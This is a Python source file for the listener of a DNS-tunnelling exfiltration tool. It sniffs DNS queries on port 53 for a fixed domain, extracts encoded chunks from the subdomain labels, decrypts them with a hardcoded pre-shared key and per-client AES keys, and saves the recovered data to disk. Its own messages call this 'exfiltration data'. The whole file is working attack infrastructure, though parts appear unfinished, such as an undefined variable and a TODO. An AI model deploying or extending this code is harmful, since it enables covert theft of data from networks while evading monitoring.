from enum import Enum
import os
import time
from scapy.all import DNS, DNSQR, DNSRR, send, sniff, IP, UDP
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
import threading


# Enum for packet types used to categorize received and sent packets
class ReceivedPacketTypes(Enum):
    START = 'a'
    DATA = 'b'


class SentPacketTypes(Enum):
    OK = 200
    MALFORMED = 201
    NX = 202  # non-existent
    OOO = 203  # out of order
    MAX = 204  # reached max connection


# Pre-shared key (PSK) for exchanging the AES key securely
psk = b"thisisaverysecurekey123456789012"  # Must match the client's PSK


class UnrelatedException(Exception):
    pass
    
class ShortCircuitException(Exception):
    pass

class NSQueryException(Exception):
    pass

class DNSSyntaxException(Exception):
    pass

class ServerMaxConnectionsException(Exception):
    pass

class NXConnectionException(Exception):
    pass

class PacketsOutOfOrderException(Exception):
    pass

# Initialize received_fragments as a dictionary to map IP addresses to their fragments
received_fragments = {}

# Initialize received_fragments as a dictionary to map IP addresses to their messages
received_messages = {}

# AES decryption for the key exchange (PSK-based)
def decrypt_with_psk(encrypted_data, psk, ip):
    global received_fragments

    # Initialize the fragment list for the IP if it doesn't exist
    if ip not in received_fragments:
        received_fragments[ip] = []

    if encrypted_data in received_fragments[ip]:
        print(f"[SERVER] Duplicate fragment from {ip}, ignoring.")
        return None, False  # Skip duplicate fragments

    # Append the new fragment
    received_fragments[ip].append(encrypted_data)
    complete_aes_key = "".join(received_fragments[ip])

    # Add base64 padding if necessary
    missing_padding = len(complete_aes_key) % 4
    if missing_padding:
        complete_aes_key += '=' * (4 - missing_padding)

    try:
        # Check if the key is complete (ends with ==)
        if complete_aes_key.endswith("=="):
            print(f"[SERVER] All fragments for {ip} received, attempting AES key decryption.")
            data = base64.b64decode(complete_aes_key)
            iv = data[:16]  # First 16 bytes are IV
            encrypted_aes_key = data[16:]  # The rest is the encrypted AES key
            cipher = AES.new(psk, AES.MODE_CBC, iv)
            decrypted_aes_key = unpad(cipher.decrypt(encrypted_aes_key), AES.block_size)
            return decrypted_aes_key, True
        else:
            print(f"[SERVER] Incomplete AES key fragments for {ip}, waiting for more.")
            return None, False  # Incomplete key
    except Exception as e:
        print(f"[SERVER] AES key decryption error: {e}")
        return None, False


# TODO: IDK IF NEED CHECK PLS
# Base64 decoding with padding
def decode_base64_with_padding(data):
    missing_padding = len(data) % 4
    if missing_padding:
        data += '=' * (4 - missing_padding)
    return base64.b64decode(data)


def decrypt_aes(data, key, ip):
    
    global received_messages

    # Initialize the fragment list for the IP if it doesn't exist
    if ip not in received_messages:
        received_messages[ip] = []

    # Check if the data fragment is already received
    if data in received_messages[ip]:
        print(f"[SERVER] Duplicate messages from {ip}, ignoring.")
        return None # Skip duplicate messages

    # Append the new fragment to the list
    received_messages[ip].append(data)
    complete_message = "".join(received_messages[ip])

    try:
        if complete_message.endswith("=") or complete_message.endswith("=="):
            print(f"[SERVER] Encrypted data (base64) for decryption: {complete_message}")
            data = decode_base64_with_padding(complete_message)  # Use the padding fix function
            iv = data[:16]
            encrypted_message = data[16:]
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted_data = unpad(cipher.decrypt(encrypted_message), AES.block_size)
            print(f"[SERVER] Decrypted message: {decrypted_data.decode('utf-8')}")
            received_messages[ip].clear()  # Clear the fragments after successful decryption
            return decrypted_data.decode('utf-8')
    except Exception as e:
        print(f"[SERVER] Decryption error: {e}")
        return None


# Class to handle the parsing of incoming data for a particular client
class DataParser:
    def __init__(self, ip):
        self.last_received = -1  # Tracks the last received packet number
        self.data = bytearray()  # Buffer for received data
        self.ip = ip

    def get_length(self):
        return len(self.data)

    def add(self, packet_number: int, data: bytes, key, ip):
        if packet_number == self.last_received:
            print(f"Repeated packet {packet_number}:{self.last_received}")
            # raise ShortCircuitException()  # Prevent duplicate processing
        if not (packet_number > self.last_received or packet_number == 0):
            self.last_received = 0
            raise PacketsOutOfOrderException()  # Packets arrived out of order
        try:
            decrypted_data = decrypt_aes(data.decode('ascii'), key, ip)
            if decrypted_data != None:
                self.data.extend(decrypted_data.encode('ascii'))  # Store decrypted data PROBLEMATIC IF DECRYPTED IS EMPTY
        except Exception as e:
            print(f"Unable to decode data packet: {e}")
        finally:
            self.last_received = packet_number

    def parse_all(self):
        return self.data.decode('ascii')

    def save_to_disk(self, path: str, id: int):
        print(f"Saving data to disk for connection {id} from IP {self.ip}")
        try:
            os.makedirs(path, exist_ok=True)
            file_path = f'{path}/{id}-{self.ip}-{int(time.time())}.log'
            with open(file_path, 'x', encoding='ascii') as file:
                file.write(self.data.decode('ascii') + '\n')  # Append a newline character
        except Exception as e:
            print(f"Error saving data: {e}")


# Manager class to handle multiple DataParsers
class DataParserManager:
    def __init__(self):
        self.parsers = []  # List of parsers for different clients

    def add_parser(self, parser: DataParser):
        self.parsers.append(parser)

    def parse(self, data: str):
        try:
            parts = data.split(".")
            print(f"Received data: {data}")

            if len(parts) < 3:
                print(f"Insufficient parts. Received parts: {parts}")
                raise DNSSyntaxException()

            packet_number = parts[0]
            connection_id = parts[1]
            hex_data = parts[2]

            packet_number = int(packet_number)
            connection_id = int(connection_id)
            
            print(f"Packet Number: {packet_number}, Connection ID: {connection_id}, Hex Data: {hex_data}")


            if connection_id > len(self.parsers):
                raise NXConnectionException()

            parser = self.parsers[connection_id - 1]
            aes_key = clients[parser.ip]['aes_key']  # Retrieve AES key for decryption
            parser.add(packet_number, bytes.fromhex(hex_data), aes_key, ip)
            return (packet_number, connection_id - 1)

        except (ValueError, IndexError):
            print("Skipping malformed data - invalid format")
            raise DNSSyntaxException()

    def number_of_connections(self):
        return len(self.parsers)

    def save_parsers(self, save_path: str):
        os.makedirs(save_path, exist_ok=True)
        for i, parser in enumerate(self.parsers):
            parser.save_to_disk(save_path, i + 1)


# Helper function to handle DNS queries
def handle_query(pkt, domain, data_parsers):
    # Ensure the packet contains a DNS query (DNSQR)
    if DNSQR in pkt:
        print(f"Full query received: {pkt[DNSQR].qname.decode()}")
        pkt.show()  # This will print detailed packet information

        qname = pkt[DNSQR].qname.decode()
        data = get_data(qname, domain)
        print(f"[SERVER] Extracted data: {data}")

        completed_key = False

        if data:
            # Step 1: If the client doesn't have an AES key yet, decrypt it with the PSK
            if pkt[IP].src not in clients:
                aes_key, completed_key = decrypt_with_psk(data, psk, pkt[IP].src)

                # Check if the full key is received
                if completed_key:
                    clients[pkt[IP].src] = {'aes_key': aes_key, 'parser': DataParser(pkt[IP].src)}
                    data_parsers.add_parser(clients[pkt[IP].src]['parser'])
                    print(f"[SERVER] Decrypted AES Key for {pkt[IP].src}")
            else:
                # Step 2: If AES key is already available, proceed with normal decryption
                aes_key = clients[pkt[IP].src]['aes_key']
                parser = clients[pkt[IP].src]['parser']
                parser.add(0, data.encode('ascii'), aes_key, pkt[IP].src)
                # print(f"[SERVER] Decrypted message for {pkt[IP].src}")

        else:
            print("[SERVER] No valid exfiltration data found.")
    else:
        print("[SERVER] Packet does not contain a DNS query (DNSQR layer not found). Ignoring packet.")



# Extract data from the DNS query
def get_data(full: str, domain: str):
    stripped = full.rstrip('.').lower()
    domain = domain.lower()

    # Ensure the domain is correctly part of the query
    if not stripped.endswith("." + domain):
        raise ShortCircuitException()

    data = full.split('.')[0]  # Get the first part before the first "."

    return data

# Global variable to end thread
stop_sniffing = threading.Event()

# Starts a listener for DNS queries on port 53
def start_listener(domain, data_parsers):
    while not stop_sniffing.is_set():
        sniff(filter="udp port 53",
              prn=lambda pkt: handle_query(pkt, domain, data_parsers),
              store=0,
              timeout=2)  # Add a timeout of 2 seconds to allow periodic checks


if __name__ == '__main__':
    clients = {}  # Store clients' AES keys after decryption
    data_parsers = DataParserManager()
    DOMAIN = 'sub.brightbuys.me'  # Example domain

    print("Starting multi-threaded DNS server...")
    listener_thread = threading.Thread(target=start_listener, args=(DOMAIN, data_parsers))
    listener_thread.daemon = True
    listener_thread.start()

    try:
        # Main server loop
        while True:
            command = input("Enter 'quit' to stop the server: ")
            if command == 'quit':
                break

    except KeyboardInterrupt:
        print("KeyboardInterrupt received, shutting down...")

    finally:
        print("Stopping the DNS server...")
        stop_sniffing.set()  # Set the stop event for sniffing
        listener_thread.join()  # Wait for the sniffing thread to stop
        print("Thread stopped")
        data_parsers.save_parsers("./logs")
        print("Goodbye.")
